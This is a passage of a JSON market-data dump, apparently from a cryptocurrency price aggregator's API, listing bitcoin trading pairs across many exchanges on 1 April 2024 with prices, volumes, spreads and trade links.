            ""timestamp"": ""2024-04-01T02:01:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:01:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:01:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.bit2me.com/exchange/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""TUSD"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 70832.11,
            ""volume"": 116.10456,
            ""converted_last"": {
                ""btc"": 1.000621,
                ""eth"": 19.652132,
                ""usd"": 70893
            },
            ""converted_volume"": {
                ""btc"": 115.857,
                ""eth"": 2275,
                ""usd"": 8208343
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T01:54:58+00:00"",
            ""last_traded_at"": ""2024-04-01T01:54:58+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:54:58+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/BTC_TUSD?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""true-usd""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""XTUSD"",
            ""market"": {
                ""name"": ""XT.COM"",
                ""identifier"": ""xt"",
                ""has_trading_incentive"": false
            },
            ""last"": 70826.52,
            ""volume"": 13.626132,
            ""converted_last"": {
                ""btc"": 1.000081,
                ""eth"": 19.630866,
                ""usd"": 70858
            },
            ""converted_volume"": {
                ""btc"": 13.587654,
                ""eth"": 266.716,
                ""usd"": 962714
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.017694,
            ""timestamp"": ""2024-04-01T02:11:22+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:22+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:22+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.xt.com/en/trade/btc_xtusd"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""xtusd""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Coinbase Exchange"",
                ""identifier"": ""gdax"",
                ""has_trading_incentive"": false
            },
            ""last"": 70865.38,
            ""volume"": 259.30745937,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 259.307,
                ""eth"": 5090,
                ""usd"": 18372478
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019598,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.coinbase.com/advanced-trade/spot/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""AVAX"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""C-Patex"",
                ""identifier"": ""c_patex"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.0007564,
            ""volume"": 7218.11556544,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.626839,
                ""usd"": 70847
            },
            ""converted_volume"": {
                ""btc"": 5.459783,
                ""eth"": 107.158,
                ""usd"": 386811
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.021151,
            ""timestamp"": ""2024-04-01T02:09:08+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:08+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:08+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://c-patex.com/exchange/AVAX/BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""avalanche-2"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""WEEX"",
                ""identifier"": ""weex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70815.6,
            ""volume"": 325.8375121,
            ""converted_last"": {
                ""btc"": 0.99921294,
                ""eth"": 19.615041,
                ""usd"": 70836
            },
            ""converted_volume"": {
                ""btc"": 324.943,
                ""eth"": 6379,
                ""usd"": 23035844
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010282,
            ""timestamp"": ""2024-04-01T02:04:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:04:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:04:28+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.weex.com/trade/btc_usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""FameEX"",
                ""identifier"": ""fameex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70820.01,
            ""volume"": 777.522067,
            ""converted_last"": {
                ""btc"": 0.99932466,
                ""eth"": 19.617088,
                ""usd"": 70805
            },
            ""converted_volume"": {
                ""btc"": 774.88,
                ""eth"": 15211,
                ""usd"": 54902497
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010028,
            ""timestamp"": ""2024-04-01T01:59:57+00:00"",
            ""last_traded_at"": ""2024-04-01T01:59:57+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:59:57+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.fameex.com/en-US/trade/btc-usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Coinbase Exchange"",
                ""identifier"": ""gdax"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05095,
            ""volume"": 3350.94341727,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.627065,
                ""usd"": 70869
            },
            ""converted_volume"": {
                ""btc"": 170.731,
                ""eth"": 3351,
                ""usd"": 12099513
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019623,
            ""timestamp"": ""2024-04-01T02:10:48+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:48+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:10:48+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.coinbase.com/advanced-trade/spot/ETH-BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""SOL"",
            ""target"": ""XBT"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.0028665,
            ""volume"": 37646.16504617,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 107.913,
                ""eth"": 2118,
                ""usd"": 7645844
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.013492,
            ""timestamp"": ""2024-04-01T02:10:34+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:34+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:04+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/SOL-XBT"",
            ""token_info_url"": null,
            ""coin_id"": ""solana"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Deepcoin"",
                ""identifier"": ""deepcoin"",
                ""has_trading_incentive"": false
            },
            ""last"": 70811.4,
            ""volume"": 4643.580377,
            ""converted_last"": {
                ""btc"": 0.99920316,
                ""eth"": 19.614703,
                ""usd"": 70796
            },
            ""converted_volume"": {
                ""btc"": 4569,
                ""eth"": 89691,
                ""usd"": 323727587
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.013389,
            ""timestamp"": ""2024-04-01T01:59:58+00:00"",
            ""last_traded_at"": ""2024-04-01T01:59:58+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:59:58+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.deepcoin.com/en/Spot?currentId=BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""EUR"",
            ""market"": {
                ""name"": ""Bitstamp"",
                ""identifier"": ""bitstamp"",
                ""has_trading_incentive"": false
            },
            ""last"": 65713.0,
            ""volume"": 140.16596218,
            ""converted_last"": {
                ""btc"": 1.000325,
                ""eth"": 19.635659,
                ""usd"": 70875
            },
            ""converted_volume"": {
                ""btc"": 140.211,
                ""eth"": 2752,
                ""usd"": 9934279
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.067198,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitstamp.net/markets/btc/eur/"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""LBank"",
                ""identifier"": ""lbank"",
                ""has_trading_incentive"": false
            },
            ""last"": 70848.73,
            ""volume"": 1938.737,
            ""converted_last"": {
                ""btc"": 0.99993875,
                ""eth"": 19.629051,
                ""usd"": 70837
            },
            ""converted_volume"": {
                ""btc"": 1939,
                ""eth"": 38056,
                ""usd"": 137333384
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.01151,
            ""timestamp"": ""2024-04-01T02:01:41+00:00"",
            ""last_traded_at"": ""2024-04-01T02:01:41+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:01:41+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.lbank.com/trade/btc_usdc"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Fastex"",
                ""identifier"": ""fastex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70803.2,
            ""volume"": 1695.04851892,
            ""converted_last"": {
                ""btc"": 0.99908746,
                ""eth"": 19.611927,
                ""usd"": 70785
            },
            ""converted_volume"": {
                ""btc"": 1694,
                ""eth"": 33243,
                ""usd"": 119984262
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.017788,
            ""timestamp"": ""2024-04-01T02:00:49+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:49+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:49+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://exchange.fastex.com/btc-usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Pionex"",
                ""identifier"": ""pionex"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05097,
            ""volume"": 5738.4777,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.62984,
                ""usd"": 70850
            },
            ""converted_volume"": {
                ""btc"": 293.871,
                ""eth"": 5769,
                ""usd"": 20820723
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.084347,
            ""timestamp"": ""2024-04-01T02:00:55+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:55+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:55+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.pionex.com/en/trade/ETH_BTC/Bot"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""Gemini"",
                ""identifier"": ""gemini"",
                ""has_trading_incentive"": false
            },
            ""last"": 70827.74,
            ""volume"": 158.57678105,
            ""converted_last"": {
                ""btc"": 0.99965618,
                ""eth"": 19.622533,
                ""usd"": 70828
            },
            ""converted_volume"": {
                ""btc"": 158.522,
                ""eth"": 3112,
                ""usd"": 11231635
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.02219,
            ""timestamp"": ""2024-04-01T02:12:03+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:03+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:03+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://exchange.gemini.com/trade/BTCUSD"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Bitstamp"",
                ""identifier"": ""bitstamp"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05096299,
            ""volume"": 87.59604224,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 4.464156,
                ""eth"": 87.628,
                ""usd"": 316295
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.040661,
            ""timestamp"": ""2024-04-01T02:11:47+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:47+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:47+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitstamp.net/markets/eth/btc/"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bitrue"",
                ""identifier"": ""bitrue"",
                ""has_trading_incentive"": false
            },
            ""last"": 70840.0,
            ""volume"": 10178.955,
            ""converted_last"": {
                ""btc"": 0.99964186,
                ""eth"": 19.622252,
                ""usd"": 70827
            },
            ""converted_volume"": {
                ""btc"": 10175,
                ""eth"": 199734,
                ""usd"": 720942046
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:11:49+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:49+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:49+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitrue.com/trade/btc_usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Azbit"",
                ""identifier"": ""azbit"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05096,
            ""volume"": 2952.522,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 151.24,
                ""eth"": 2969,
                ""usd"": 10715703
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019619,
            ""timestamp"": ""2024-04-01T02:12:42+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:42+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:42+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://azbit.com/exchange/ETH_BTC?referralCode=OH5QDS1"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Azbit"",
                ""identifier"": ""azbit"",
                ""has_trading_incentive"": false
            },
            ""last"": 70840.0,
            ""volume"": 598.783029,
            ""converted_last"": {
                ""btc"": 0.99964186,
                ""eth"": 19.622252,
                ""usd"": 70827
            },
            ""converted_volume"": {
                ""btc"": 596.063,
                ""eth"": 11700,
                ""usd"": 42232285
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:42+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:42+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:42+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://azbit.com/exchange/BTC_USDT?referralCode=OH5QDS1"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""MEXC"",
                ""identifier"": ""mxc"",
                ""has_trading_incentive"": false
            },
            ""last"": 70860.83,
            ""volume"": 10.93587,
            ""converted_last"": {
                ""btc"": 1.000124,
                ""eth"": 19.631725,
                ""usd"": 70861
            },
            ""converted_volume"": {
                ""btc"": 10.937231,
                ""eth"": 214.69,
                ""usd"": 774926
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.029396,
            ""timestamp"": ""2024-04-01T02:11:41+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:41+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:41+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.mexc.com/exchange/BTC_USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""KuCoin"",
                ""identifier"": ""kucoin"",
                ""has_trading_incentive"": false
            },
            ""last"": 70857.9,
            ""volume"": 77.45633855,
            ""converted_last"": {
                ""btc"": 1.000083,
                ""eth"": 19.630914,
                ""usd"": 70858
            },
            ""converted_volume"": {
                ""btc"": 77.463,
                ""eth"": 1521,
                ""usd"": 5488400
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.012281,
            ""timestamp"": ""2024-04-01T02:12:37+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:37+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:37+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.kucoin.com/trade/BTC-USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Cryptology"",
                ""identifier"": ""cryptology"",
                ""has_trading_incentive"": false
            },
            ""last"": 70780.33,
            ""volume"": 21.89036598,
            ""converted_last"": {
                ""btc"": 0.9988355,
                ""eth"": 19.603984,
                ""usd"": 70765
            },
            ""converted_volume"": {
                ""btc"": 21.864875,
                ""eth"": 429.138,
                ""usd"": 1549068
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.020008,
            ""timestamp"": ""2024-04-01T02:09:13+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:13+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:13+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://cryptology.com/app/next/trading/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Biconomy"",
                ""identifier"": ""biconomy"",
                ""has_trading_incentive"": false
            },
            ""last"": 70848.0,
            ""volume"": 1086.5012,
            ""converted_last"": {
                ""btc"": 0.9999434,
                ""eth"": 19.628171,
                ""usd"": 70848
            },
            ""converted_volume"": {
                ""btc"": 1081,
                ""eth"": 21227,
                ""usd"": 76620402
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:25+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:25+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:25+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.biconomy.com/exchange/BTC_USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""DigiFinex"",
                ""identifier"": ""digifinex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70848.0,
            ""volume"": 213.57853,
            ""converted_last"": {
                ""btc"": 0.9999434,
                ""eth"": 19.628171,
                ""usd"": 70848
            },
            ""converted_volume"": {
                ""btc"": 213.566,
                ""eth"": 4192,
                ""usd"": 15131631
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:49+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:49+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:49+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.digifinex.com/en-ww/trade/USDC/BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bitcointry Exchange"",
                ""identifier"": ""bitcointry_exchange"",
                ""has_trading_incentive"": false
            },
            ""last"": 70859.53,
            ""volume"": 7.5931,
            ""converted_last"": {
                ""btc"": 0.9998328,
                ""eth"": 19.62978,
                ""usd"": 70830
            },
            ""converted_volume"": {
                ""btc"": 7.555504,
                ""eth"": 148.338,
                ""usd"": 535246
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:02:26+00:00"",
            ""last_traded_at"": ""2024-04-01T02:02:26+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:02:26+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://bitcointry.com/en/exchange/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""BTSE"",
                ""identifier"": ""btse"",
                ""has_trading_incentive"": false
            },
            ""last"": 70837.6022925935,
            ""volume"": 346.15403442936383,
            ""converted_last"": {
                ""btc"": 0.99960802,
                ""eth"": 19.621588,
                ""usd"": 70824
            },
            ""converted_volume"": {
                ""btc"": 346.018,
                ""eth"": 6792,
                ""usd"": 24516127
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010565,
            ""timestamp"": ""2024-04-01T02:11:10+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:10+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:10+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.btse.com/en/trading/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""WBTC"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""OKX"",
                ""identifier"": ""okex"",
                ""has_trading_incentive"": false
            },
            ""last"": 1.0009,
            ""volume"": 13.9507,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 13.967028,
                ""eth"": 274.163,
                ""usd"": 989593
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.029967,
            ""timestamp"": ""2024-04-01T02:11:27+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:27+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:21+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.okx.com/trade-spot/wbtc-btc"",
            ""token_info_url"": null,
            ""coin_id"": ""wrapped-bitcoin"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""HashKey Exchange"",
                ""identifier"": ""hashkey_exchange"",
                ""has_trading_incentive"": false
            },
            ""last"": 70875.27,
            ""volume"": 143.62501,
            ""converted_last"": {
                ""btc"": 1.000486,
                ""eth"": 19.642599,
                ""usd"": 70876
            },
            ""converted_volume"": {
                ""btc"": 143.201,
                ""eth"": 2811,
                ""usd"": 10144593
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.017136,
            ""timestamp"": ""2024-04-01T02:02:25+00:00"",
            ""last_traded_at"": ""2024-04-01T02:02:25+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:02:25+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.hashkey.com/en-US/spot/BTC_USD"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Nominex"",
                ""identifier"": ""nominex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70866.89,
            ""volume"": 0.8214066498896735,
            ""converted_last"": {
                ""btc"": 1.00021,
                ""eth"": 19.633404,
                ""usd"": 70867
            },
            ""converted_volume"": {
                ""btc"": 0.82157916,
                ""eth"": 16.127009,
                ""usd"": 58211
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:11:12+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:12+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:12+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://nominex.io/en/markets/BTC/USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""WBTC"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Bybit"",
                ""identifier"": ""bybit_spot"",
                ""has_trading_incentive"": false
            },
            ""last"": 1.0001,
            ""volume"": 3.3452,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 3.347568,
                ""eth"": 65.71,
                ""usd"": 237182
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019999,
            ""timestamp"": ""2024-04-01T02:10:17+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:17+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:23+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bybit.com/trade/spot/WBTC/BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""wrapped-bitcoin"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""BitMart"",
                ""identifier"": ""bitmart"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.050965,
            ""volume"": 1231.4022,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 62.758,
                ""eth"": 1232,
                ""usd"": 4446565
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.017848,
            ""timestamp"": ""2024-04-01T02:11:43+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:43+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:43+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitmart.com/trade/en?symbol=ETH_BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""CoinEx"",
                ""identifier"": ""coinex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70818.66,
            ""volume"": 155.82745519,
            ""converted_last"": {
                ""btc"": 0.99930561,
                ""eth"": 19.616715,
                ""usd"": 70804
            },
            ""converted_volume"": {
                ""btc"": 155.288,
                ""eth"": 3048,
                ""usd"": 11002583
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T01:59:45+00:00"",
            ""last_traded_at"": ""2024-04-01T01:59:45+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:59:45+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.coinex.com/trading?currency=USDT&dest=BTC#limit"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""EUR"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 65744.62,
            ""volume"": 120.66143,
            ""converted_last"": {
